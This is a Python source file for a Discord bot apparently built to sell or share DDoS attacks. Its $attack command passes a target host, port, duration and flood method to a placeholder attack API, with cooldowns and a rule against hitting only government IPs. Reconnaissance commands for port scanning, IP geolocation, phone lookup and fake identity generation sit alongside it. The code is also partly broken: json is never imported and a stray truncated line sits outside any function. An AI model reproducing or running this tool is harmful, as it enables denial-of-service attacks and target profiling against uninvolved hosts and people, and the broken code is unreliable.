# Version 1.0 developed by Ramses Salcedo
# Questions? Add me on Discord at Alyx#7777

import collections
import discord
from discord.ext import commands
import requests
import time
from discord import User
from discord.ext.commands import has_permissions

start_time = time.time()

ver = "1.0"

bot = commands.Bot(command_prefix="$")
bot.remove_command('help')
bot.remove_command('methods')
bot.remove_command('plans')

@bot.command()
async def help(self):
        help = discord.Embed(title=f"xyz Help Menu", color=0x992d22, description="Prefix $")
        help.add_field(name="▸ Attacktut", value="Shows you how to send an attack", inline=False)
        help.add_field(name="▸ Rules", value="Shows rules", inline=False)
        help.add_field(name="▸ Attack", value="Launches an attack", inline=False)
        help.add_field(name="▸ Tools", value="Shows tools", inline=False)
        help.add_field(name="▸ Changelog", value="Shows recent changelog", inline=False)
        help.add_field(name="▸ Misc", value="Shows misc", inline=False)
        help.set_footer(text="Developed by Alyx#7777")
        await self.send(embed=help)

@bot.command()
async def attacktut(ctx):
    plan = discord.Embed(title="Attack Tutorial", 
        color=0x992d22)
    plan.add_field(name="Example", value="▸ $attack [host] [port] [time] [method]", inline=False)
    plan.set_footer(text="Developed by Alyx#7777")
    await ctx.send(embed=plan) 

@bot.command()
async def misc(ctx):
    misc = discord.Embed(title="Misc", 
        color=0x992d22)
    misc.add_field(name="Stats", value="▸ Shows the bot stats", inline=False)
    misc.add_field(name="Profile", value="▸ Shows your profile", inline=False)
    misc.set_footer(text="Developed by Alyx#7777")
    await ctx.send(embed=misc) 

@bot.command()
async def rules(ctx):
    rules = discord.Embed(title="Rules", 
        color=0x992d22)
    rules.add_field(name="Hitting government IPs", value="▸ Prohibited and you will be removed (or banned) from the bot", inline=False)
    rules.add_field(name="Trying to spam attacks", value="▸ Prohibited and you will be removed (or banned) from the bot", inline=False)
    rules.set_footer(text="Developed by Alyx#7777")
    await ctx.send(embed=rules) 

@bot.command()
async def tools(ctx):
    tools = discord.Embed(title="Tools", 
        color=0x992d22)
    tools.add_field(name="Portscan [ip]", value="▸ Portscan an IP address", inline=False)
    tools.add_field(name="GeoIP [ip]", value="▸ Geolocation of IP", inline=False)
    tools.add_field(name="Ping [ip]", value="▸ Ping a IP Address", inline=False)
    tools.add_field(name="Geninfo [male/female]", value="▸ Random person info generator", inline=False)
    tools.add_field(name="Checkweb [url]", value="▸ Checks if a host is up or down", inline=False)
    tools.add_field(name="Ip2domain [ip]", value="▸ Attempts to find websites hosted on the specific IP address", inline=False)
    tools.add_field(name="Phonelookup [country code + number]", value="▸ Get more information about any phone number", inline=False)
    tools.add_field(name="Urlshortener [url]", value="▸ Shortens the URL of any website", inline=False)
    tools.add_field(name="Mac [address]", value="▸ Search up mac address", inline=False)
    tools.set_footer(text="Developed by Alyx#7777")
    await ctx.send(embed=tools)

@bot.command()
async def changelog(ctx):
    changelog = discord.Embed(title="Changelog version 1.0", 
        color=0x992d22)
    changelog.add_field(name="Created bot", value="▸ First version released", inline=False)
    changelog.set_footer(text="Developed by Alyx#7777")
    await ctx.send(embed=changelog)  

# DDoS Layer 4 
@bot.command()
@commands.cooldown(1, 120, commands.BucketType.user)
async def attack(ctx, host, port, secs, method):
        if int(secs) <= 1200:
            logger = {"content": "```-----------xyz Attack Logs-----------\nMember:\n"+str(ctx.author)+"\nHost:\n"+str(host)+"\nPort:\n"+str(port)+"\nMethod:\n"+str(method)+"```"}
            requests.post(url='DISCORD WEBHOOK URL FOR LOGGER GOES HERE',data=logger)
            requests.get('API LINK GOES HERE&host='+host+'&port='+port+'&time='+secs+'&method='+method)
            sent = discord.Embed(title="xyz has sent an attack!", color=0xe61010)
            sent.add_field(name="IP:", value=f"▸ {host}", inline=False)
            sent.add_field(name="Port:", value=f"▸ {port}", inline=False)
            sent.add_field(name="Seconds:", value=f"▸ {secs}", inline=False)
            sent.add_field(name="Method:", value=f"▸ {method}", inline=False)
            msg = await ctx.send(embed=sent)
            isec = int(secs)
            while isec > 0:
                isec -= 1
                after = discord.Embed(title="xyz has sent an attack!", color=0xe61010)
                after.add_field(name="Host:", value=f"▸ {host}", inline=False)
                after.add_field(name="Port:", value=f"▸ {port}", inline=False)
                after.add_field(name="Seconds:", value=f"▸ {isec}", inline=False)
                after.add_field(name="Method:", value=f"▸ {method}", inline=False)
                await msg.edit(embed=after)
                time.sleep(1)
        elif int(secs) > 1200:
            invalid_syntax = discord.Embed(title="You cannot send an attack greater than 1200 seconds", color=0xe61010)
            await ctx.send(embed=invalid_syntax)

# Web Tools
@bot.command()
async def portscan(self,ip):
    portsjsonified=requests.get('https://api.c99.nl/portscanner?key=YOUR API KEY&host='+ip+'&json')
    ports=json.loads(portsjsonified.text)
    embed = discord.Embed(title='xyz PortScanner',color=0x992d22)
    embed.add_field(name='Open Ports',value=ports['port'].replace(',','\n'))
    embed.set_footer(text="Developed by Alyx#7777")
    await self.send(embed=embed)
    
@bot.command()
async def ping(self,ip):
    upordown=requests.get('https://api.c99.nl/ping?key=YOUR API KEY&host='+ip+'&json')
    resalts = json.loads(upordown.text)
    embed = discord.Embed(title='xyz Pinger',color=0x992d22)
    embed.add_field(name='Result',value='Up: '+'**'+str(resalts['success'])+'**')
    embed.add_field(name='Stats:',value=resalts['result'].replace('<br>','\n'),inline=False)
    embed.set_footer(text="Developed by Alyx#7777")
    await self.send(embed=embed)

@bot.command()
async def geoip(self,ip):
    geoip = requests.get('https://api.c99.nl/geoip?key=YOUR API KEY&host='+ip)
    embed=discord.Embed(title='xyz GeoIP:', color=0x992d22)
    embed.add_field(name='Geolocation information:',value=geoip.text.replace('<br>','\n'))
    embed.set_footer(text="Developed by Alyx#7777")
    await self.send(embed=embed)
 
@bot.command()
async def geninfo(self,gender):
    geninfo = requests.get('https://api.c99.nl/randomperson?key=YOUR API KEY&gender='+gender)
    embed=discord.Embed(title='xyz Info Generator:', color=0x992d22)
    embed.add_field(name='Generator Results:',value=geninfo.text.replace('<br>','\n'))
    embed.set_footer(text="Developed by Alyx#7777")
    await self.send(embed=embed)

@bot.command()
async def checkweb(self,website):
    checkweb = requests.get('https://api.c99.nl/upordown?key=YOUR API KEY&host='+website)
    embed=discord.Embed(title='xyz Website Checker:', color=0x992d22)
    embed.add_field(name='Checker Results:',value=checkweb.text.replace('<br>','\n'))
    embed.set_footer(text="Developed by Alyx#7777")
    await self.send(embed=embed)

@bot.command()
async def ip2domain(self,domain):
    ip2domain = requests.get('https://api.c99.nl/ip2domains?key=YOUR API KEY&ip='+domain)
    embed=discord.Embed(title='xyz Website Checker:', color=0x992d22)
    embed.add_field(name='Checker Results:',value=ip2domain.text.replace('<br>','\n'))
    embed.set_footer(text="Developed by Alyx#7777")
    await self.send(embed=embed)
 
@bot.command()
async def phonelookup(self,number):
    phonelookup = requests.get('https://api.c99.nl/phonelookup?key=YOUR API KEY&number='+number)
    embed=discord.Embed(title='xyz Phone Lookup:', color=0x992d22)
    embed.add_field(name='Lookup Results:',value=phonelookup.text.replace('<br>','\n'))
    embed.set_footer(text="Developed by Alyx#7777")
    await self.send(embed=embed)

@bot.command()
async def urlshortener(self,website):
    urlshortener = requests.get('https://api.c99.nl/urlshortener?key=YOUR API KEY&url='+website)
    embed=discord.Embed(title='xyz URL Shortener:', color=0x992d22)
    embed.add_field(name='Lookup Results:',value=urlshortener.text.replace('<br>','\n'))
    embed.set_footer(text="Developed by Alyx#7777")
    await self.send(embed=embed)

@bot.command(pass_context = True)
async def stats(ctx):
    second = time.time() - start_time
    minute, second = divmod(second, 60)
    hour, minute = divmod(minute, 60)
    day, hour = divmod(hour, 24)
    week, day = divmod(day, 7)
    embed = discord.Embed(color = 0x992d22)
    embed.add_field(name="Version", value=ver, inline=False)
    embed.add_field(name="Weeks", value=" %d"% (week), inline=False)
    embed.add_field(name="Days", value=" %d"% (day), inline=False)
    embed.add_field(name="Hours", value=" %d"% (hour), inline=False)
    embed.add_field(name="Minutes", value=" %d"% (minute), inline=False)
    embed.set_footer(text="Developed by Alyx#7777")
    await ctx.send(embed=embed)

@attack.error
async def attack_error(self,error):
    embed = discord.Embed(title='Cooldown',description = 'You are on cooldown try again in: '+str(round(error.retry_after))+' secs', color=0x992d22)
    await self.send(embed=embed)

@bot.command()
async def profile(message):
        user = message.author.id
        print(user)
        embed = discord.Embed(title="Your profile", color=0x992d22)
        embed.add_field(name="Username:", value=f"{message.author}", inline=False)
        embed.add_field(name="ID:", value=f"{message.author.id}", inline=False)
        embed.set_footer(text="Developed by Alyx#7777")
        await message.send(embed=embed)
ait ctx.send(embed=plan, file=file) 

@bot.event
async def on_ready():
    await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name="anonymous"))
    print("Bot is ready!")
bot.run('YOUR KEY GOES HERE')